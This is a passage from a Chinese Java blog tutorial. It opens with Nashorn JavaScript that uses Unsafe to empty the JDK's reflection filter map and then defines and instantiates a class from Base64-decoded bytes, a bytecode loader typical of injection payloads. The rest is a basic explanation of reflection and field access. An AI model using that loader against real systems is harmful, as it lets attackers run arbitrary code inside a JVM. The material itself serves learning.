</blockquote>
<p> 核心原因在于 <code>jdk.internal.reflect.Reflection#fieldFilterMap</code> 的变化。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fieldFilterMap = Map.of(</span><br><span class="line">    Reflection.class, ALL_MEMBERS,</span><br><span class="line">    AccessibleObject.class, ALL_MEMBERS,</span><br><span class="line">    Class.class, Set.of(<span class="string">&quot;classLoader&quot;</span>),</span><br><span class="line">    ClassLoader.class, ALL_MEMBERS,</span><br><span class="line">    Constructor.class, ALL_MEMBERS,</span><br><span class="line">    Field.class, ALL_MEMBERS,</span><br><span class="line">    Method.class, ALL_MEMBERS, <span class="comment">// 禁止反射获取 Method 中的所有属性</span></span><br><span class="line">    Module.class, ALL_MEMBERS,</span><br><span class="line">    System.class, Set.of(<span class="string">&quot;security&quot;</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>

<h4 id="置空-fieldFilterMap"><a href="#置空-fieldFilterMap" class="headerlink" title="置空 fieldFilterMap"></a>置空 fieldFilterMap</h4><p>我们可以通过反射置空 <code>fieldFilterMap</code> 绕过上述限制：</p>
<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">bypass</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 获取Unsafe对象</span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Unsafe</span> = <span class="title class_">Java</span>.<span class="title function_">type</span>(<span class="string">&#x27;sun.misc.Unsafe&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">HashMap</span> = <span class="title class_">Java</span>.<span class="title function_">type</span>(<span class="string">&#x27;java.util.HashMap&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> field = <span class="title class_">Unsafe</span>.<span class="property">class</span>.<span class="title function_">getDeclaredField</span>(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">    field.<span class="title function_">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">var</span> unsafe = field.<span class="title function_">get</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 利用defineAnonymousClass获取fieldFilterMap偏移</span></span><br><span class="line">    <span class="keyword">var</span> classClass = <span class="title class_">Java</span>.<span class="title function_">type</span>(<span class="string">&quot;java.lang.Class&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> reflectionClass = java.<span class="property">lang</span>.<span class="property">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;jdk.internal.reflect.Reflection&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> classBuffer = reflectionClass.<span class="title function_">getResourceAsStream</span>(<span class="string">&quot;Reflection.class&quot;</span>).<span class="title function_">readAllBytes</span>();</span><br><span class="line">    <span class="keyword">var</span> reflectionAnonymousClass = unsafe.<span class="title function_">defineAnonymousClass</span>(reflectionClass, classBuffer, <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">var</span> fieldFilterMapField = reflectionAnonymousClass.<span class="title function_">getDeclaredField</span>(<span class="string">&quot;fieldFilterMap&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清空原有的fieldFilterMap</span></span><br><span class="line">    <span class="keyword">if</span> (fieldFilterMapField.<span class="title function_">getType</span>().<span class="title function_">isAssignableFrom</span>(<span class="title class_">HashMap</span>.<span class="property">class</span>)) &#123;</span><br><span class="line">    unsafe.<span class="title function_">putObject</span>(reflectionClass, unsafe.<span class="title function_">staticFieldOffset</span>(fieldFilterMapField), <span class="keyword">new</span> <span class="title class_">HashMap</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清除缓存</span></span><br><span class="line">    <span class="keyword">var</span> clz = java.<span class="property">lang</span>.<span class="property">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;java.lang.Class&quot;</span>).<span class="title function_">getResourceAsStream</span>(<span class="string">&quot;Class.class&quot;</span>).<span class="title function_">readAllBytes</span>();</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">ClassAnonymousClass</span> = unsafe.<span class="title function_">defineAnonymousClass</span>(java.<span class="property">lang</span>.<span class="property">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;java.lang.Class&quot;</span>), clz, <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">var</span> reflectionDataField = <span class="title class_">ClassAnonymousClass</span>.<span class="title function_">getDeclaredField</span>(<span class="string">&quot;reflectionData&quot;</span>);</span><br><span class="line">    unsafe.<span class="title function_">putObject</span>(classClass, unsafe.<span class="title function_">objectFieldOffset</span>(reflectionDataField), <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>完整代码如下：</p>
<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> theUnsafeMethod = java.<span class="property">lang</span>.<span class="property">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;sun.misc.Unsafe&quot;</span>).<span class="title function_">getDeclaredField</span>(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">theUnsafeMethod.<span class="title function_">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line">unsafe = theUnsafeMethod.<span class="title function_">get</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bypass</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> reflectionClass = java.<span class="property">lang</span>.<span class="property">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;jdk.internal.reflect.Reflection&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> classBuffer = reflectionClass.<span class="title function_">getResourceAsStream</span>(<span class="string">&quot;Reflection.class&quot;</span>).<span class="title function_">readAllBytes</span>();</span><br><span class="line">    <span class="keyword">var</span> reflectionAnonymousClass = unsafe.<span class="title function_">defineAnonymousClass</span>(reflectionClass, classBuffer, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> fieldFilterMapField = reflectionAnonymousClass.<span class="title function_">getDeclaredField</span>(<span class="string">&quot;fieldFilterMap&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fieldFilterMapField.<span class="title function_">getType</span>().<span class="title function_">isAssignableFrom</span>(java.<span class="property">lang</span>.<span class="property">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;java.util.HashMap&quot;</span>))) &#123;</span><br><span class="line">        unsafe.<span class="title function_">putObject</span>(reflectionClass, unsafe.<span class="title function_">staticFieldOffset</span>(fieldFilterMapField), java.<span class="property">lang</span>.<span class="property">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;java.util.HashMap&quot;</span>).<span class="title function_">newInstance</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> clz = java.<span class="property">lang</span>.<span class="property">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;java.lang.Class&quot;</span>).<span class="title function_">getResourceAsStream</span>(<span class="string">&quot;Class.class&quot;</span>).<span class="title function_">readAllBytes</span>();</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">ClassAnonymousClass</span> = unsafe.<span class="title function_">defineAnonymousClass</span>(java.<span class="property">lang</span>.<span class="property">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;java.lang.Class&quot;</span>), clz, <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">var</span> reflectionDataField = <span class="title class_">ClassAnonymousClass</span>.<span class="title function_">getDeclaredField</span>(<span class="string">&quot;reflectionData&quot;</span>);</span><br><span class="line">    unsafe.<span class="title function_">putObject</span>(java.<span class="property">lang</span>.<span class="property">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;java.lang.Class&quot;</span>), unsafe.<span class="title function_">objectFieldOffset</span>(reflectionDataField), <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Base64DecodeToByte</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> bt;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        bt = java.<span class="property">lang</span>.<span class="property">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>).<span class="title function_">newInstance</span>().<span class="title function_">decodeBuffer</span>(str);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        bt = java.<span class="property">util</span>.<span class="property">Base64</span>.<span class="title function_">getDecoder</span>().<span class="title function_">decode</span>(str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">defineClass</span>(<span class="params">classBytes</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        unsafe.<span class="title function_">defineClass</span>(<span class="literal">null</span>, classBytes, <span class="number">0</span>, classBytes.<span class="property">length</span>, <span class="literal">null</span>, <span class="literal">null</span>).<span class="title function_">newInstance</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="title function_">bypass</span>()</span><br><span class="line">        <span class="keyword">var</span> defineClassMethod = java.<span class="property">lang</span>.<span class="property">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;java.lang.ClassLoader&quot;</span>).<span class="title function_">getDeclaredMethod</span>(</span><br><span class="line">            <span class="string">&quot;defineClass&quot;</span>,</span><br><span class="line">            java.<span class="property">lang</span>.<span class="property">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;[B&quot;</span>),</span><br><span class="line">            java.<span class="property">lang</span>.<span class="property">Integer</span>.<span class="property">TYPE</span>,</span><br><span class="line">            java.<span class="property">lang</span>.<span class="property">Integer</span>.<span class="property">TYPE</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">var</span> modifiers = defineClassMethod.<span class="title function_">getClass</span>().<span class="title function_">getDeclaredField</span>(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        unsafe.<span class="title function_">putShort</span>(defineClassMethod, unsafe.<span class="title function_">objectFieldOffset</span>(modifiers), <span class="number">0x00000001</span>);</span><br><span class="line">        <span class="keyword">var</span> cc = defineClassMethod.<span class="title function_">invoke</span>(</span><br><span class="line">            java.<span class="property">lang</span>.<span class="property">Thread</span>.<span class="title function_">currentThread</span>().<span class="title function_">getContextClassLoader</span>(),</span><br><span class="line">            classBytes,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            classBytes.<span class="property">length</span></span><br><span class="line">        );</span><br><span class="line">        cc.<span class="title function_">newInstance</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">defineClass</span>(<span class="title class_">Base64DecodeToByte</span>(code));</span><br></pre></td></tr></table></figure></div>

<h4 id="使用-Unsafe-defineAnonymousClass-代替"><a href="#使用-Unsafe-defineAnonymousClass-代替" class="headerlink" title="使用 Unsafe#defineAnonymousClass 代替"></a>使用 Unsafe#defineAnonymousClass 代替</h4><p>如果仅仅是为了<code>defineClass</code>，不需要绕过 JDK 机制那么麻烦， 别忘了 <code>Unsafe#defineAnonymousClass</code> 是没有被移除的。</p>
<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">defineClass</span>(<span class="params">classBytes</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> theUnsafe = java.<span class="property">lang</span>.<span class="property">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;sun.misc.Unsafe&quot;</span>).<span class="title function_">getDeclaredField</span>(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">    theUnsafe.<span class="title function_">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line">    unsafe = theUnsafe.<span class="title function_">get</span>(<span class="literal">null</span>);</span><br><span class="line">    unsafe.<span class="title function_">defineAnonymousClass</span>(java.<span class="property">lang</span>.<span class="property">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;java.lang.Class&quot;</span>), classBytes, <span class="literal">null</span>).<span class="title function_">newInstance</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><p>Java 反射（Reflection）机制是 Java 提供的一种非常强大的功能，它允许程序在运行时 <strong>动态地获取类的信息</strong>，并能够 <strong>操作类的方法、字段、构造器等成员</strong>。反射机制提供了对类、方法、字段等元数据的访问，而不需要在编译时提前知道这些信息。</p>
<p>反射机制的核心是 <strong><code>java.lang.reflect</code> 包</strong> 和 <strong><code>java.lang.Class</code> 类</strong>。</p>
<p>JVM 为每个加载的类创建了对应的 <code>java.lang.Class</code> 实例，并在该实例中保存了类的所有信息。因此，如果我们获取了某个类的 <code>Class</code> 实例，我们就可以通过这个 <code>Class</code> 实例获取到该实例对应  <code>java.lang.reflect</code> 包提供的一系列类的实例。通过获取到的这些实例，我们可以<strong>获取类的信息</strong>（如构造方法、字段、方法等），并能 <strong>操作对象的字段</strong> 或 <strong>调用方法</strong>。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/95cf25f872504b8597418ff8821ff793.png"
                      alt="在这里插入图片描述" style="zoom: 33%;" 
                ></p>
<ul>
<li><code>Method</code>：表示类中的方法，允许程序获取、调用类的方法。</li>
<li><code>Field</code>：表示类的字段，允许程序访问、修改对象的字段（包括私有字段）。</li>
<li><code>Constructor</code>：表示类的构造器，允许动态创建类的实例。</li>
</ul>
<h2 id="获取-Class-实例"><a href="#获取-Class-实例" class="headerlink" title="获取 Class 实例"></a>获取 Class 实例</h2><p>每个 Java 类在运行时都有一个唯一的 <code>Class</code> 对象，该对象包含了该类的所有信息。反射的前提就是先要获取到这个 <code>Class</code> 对象。通常我们有三种获取方式这个 <code>Class</code> 对象。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/3022d47fa0f749b3a0d75d17e0857fba.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></p>
<h3 id="通过类名获取"><a href="#通过类名获取" class="headerlink" title="通过类名获取"></a>通过类名获取</h3><p>可以借助 <code>Class</code> 类的 <code>forName</code> 方法来获取 <code>Class</code> 实例，参数是目标类的<strong>全限定类名</strong>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;com.example.MyClass&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>在 Java 中，<strong>类名</strong>（Class Name）指的是用于标识<strong>类</strong>的名称。</p>
<p>Java 中的类名可能有多个相同的类名，这些类名可能位于不同的包中。为了区分它们，我们需要使用 <strong>全限定类名</strong>，即包含包名的类名。</p>
<p>例如：<code>java.util.ArrayList</code>，这里 <code>java.util</code> 是包名，<code>ArrayList</code> 是类名。整个字符串 <code>java.util.ArrayList</code> 就是该类的<strong>全限定类名</strong>。</p>
<p>由于 <code>Class</code> 实例存放着类的所有信息，因此我们可以通过 <code>Class</code> 的 <code>getName</code> 方法获取一个类的全限定名称。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(MyClass.class.getName());</span><br></pre></td></tr></table></figure></div>
</blockquote>
<h3 id="通过对象获取"><a href="#通过对象获取" class="headerlink" title="通过对象获取"></a>通过对象获取</h3><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">MyClass</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line">Class&lt;?&gt; clazz = obj.getClass();</span><br></pre></td></tr></table></figure></div>

<h3 id="通过类获取"><a href="#通过类获取" class="headerlink" title="通过类获取"></a>通过类获取</h3><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = MyClass.class;</span><br></pre></td></tr></table></figure></div>

<h2 id="操作字段"><a href="#操作字段" class="headerlink" title="操作字段"></a>操作字段</h2><h3 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h3><p>反射提供了两种方法来获取字段信息：</p>
<ul>
<li><p><strong><code>getField(String name)</code></strong> ：获取<strong>公共字段</strong>（包括父类中的公共字段）。如果字段是私有的或保护的，它将抛出 <code>NoSuchFieldException</code> 异常。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Field <span class="title function_">getField</span><span class="params">(String name)</span> <span class="keyword">throws</span> NoSuchFieldException</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>getDeclaredField(String name)</code></strong> ：获取当前类<strong>声明的字段</strong>（包括<strong>私有字段</strong>，但<strong>不包括继承的字段</strong>）。如果字段不存在，则抛出 <code>NoSuchFieldException</code> 异常。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Field <span class="title function_">getDeclaredField</span><span class="params">(String name)</span> <span class="keyword">throws</span> NoSuchFieldException</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>另外对于获取到的私有字段，反射提供了 <code>setAccessible(boolean flag)</code> 方法来允许对私有字段的访问。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAccessible</span><span class="params">(<span class="type">boolean</span> flag)</span> <span class="keyword">throws</span> SecurityException</span><br></pre></td></tr></table></figure></div>

<p>其中参数 <code>flag</code>：</p>
<ul>
<li>如果为 <code>true</code>，则表示允许访问字段（即使该字段是 <code>private</code>、<code>protected</code> 或包内字段）。</li>
<li>如果为 <code>false</code>，则恢复字段的访问控制。</li>
</ul>
<p>在 <code>getDeclaredField</code> 的基础上我们还可以循环遍历当前类的父类从而确保继承的字段也能获取到：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 逐级获取字段，使用 while 循环并实现 getDeclaredField</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getDeclaredField</span><span class="params">(Class&lt;?&gt; clazz, String fieldName)</span> &#123;</span><br><span class="line">    <span class="comment">// 使用 while 循环遍历类及其父类</span></span><br><span class="line">    <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 尝试获取当前类的指定字段</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);  <span class="comment">// 尝试获取字段</span></span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);  <span class="comment">// 允许对私有字段的访问</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> field;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="comment">// 如果当前类没有该字段，则继续查找父类</span></span><br><span class="line">            clazz = clazz.getSuperclass();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果找不到字段，返回 null</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>反射还提供了 <code>getFields()</code> 和 <code>getDeclaredFields()</code> 方法来获取类的所有字段：</p>
<ul>
<li><p><strong><code>getFields()</code></strong> ：返回当前类及其父类中所有公共字段。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Field[] getFields() <span class="keyword">throws</span> SecurityException</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>getDeclaredField</code></strong> ：返回当前类中所有声明的字段（包括私有字段）。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Field[] getDeclaredFields() <span class="keyword">throws</span> SecurityException</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="获取字段值"><a href="#获取字段值" class="headerlink" title="获取字段值"></a>获取字段值</h3><p>获取字段值是 Java 反射机制中的一个常见操作。我们可以使用 <code>Field</code> 对象的 <code>get(Object obj)</code> 方法可以来获取字段的值。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IllegalArgumentException, IllegalAccessException</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p>同名字段在子类里只会“遮蔽”父类字段；拿哪个 <code>Field</code>，就只访问哪个类型里声明的那一个。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123; <span class="keyword">public</span> <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">1</span>; &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_">A</span> &#123; <span class="keyword">public</span> <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">2</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">fA</span> <span class="operator">=</span> A.class.getField(<span class="string">&quot;x&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">fB</span> <span class="operator">=</span> B.class.getField(<span class="string">&quot;x&quot;</span>);</span><br><span class="line"><span class="type">B</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">B</span>();</span><br><span class="line"></span><br><span class="line">System.out.println(fA.get(b)); <span class="comment">// 1  ← 访问的是 A.x</span></span><br><span class="line">System.out.println(fB.get(b)); <span class="comment">// 2  ← 访问的是 B.x</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>实例字段：<code>field.get(obj)</code> 要求 <code>obj</code> 是 <strong>declaringClass 的实例&#x2F;子类</strong>。</li>
<li>静态字段：<code>obj</code> 参数<strong>被忽略</strong>，可传 <code>null</code>。</li>
</ul>

    </div>
  </div>

<p>我们通常把获取字段值的操作封装成 <code>getFieldValue</code> 函数方便使用：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object object, String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> field.get(object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于字段可能是从父类中继承的，因此我们可以使用前面实现的 <code>getDeclaredField</code> 函数来获取字段。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object object, String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">return</span> getDeclaredField(object.getClass(), fieldName).get(object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="设置字段值"><a href="#设置字段值" class="headerlink" title="设置字段值"></a>设置字段值</h3><p>同样的，使用 <code>Field</code> 对象的 <code>set(Object obj, Object value)</code> 方法可以设置字段的值。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(Object obj, Object value)</span> <span class="keyword">throws</span> IllegalArgumentException, IllegalAccessException</span><br></pre></td></tr></table></figure></div>

<p>我们通常把获取字段值的操作封装成 <code>setFieldValue</code> 函数方便使用：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    field.set(object, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果修改的字段可能是从父类中继承的，则使用前面实现的 <code>getDeclaredField</code> 函数来获取字段。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    getDeclaredField(object.getClass(), fieldName).set(object, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

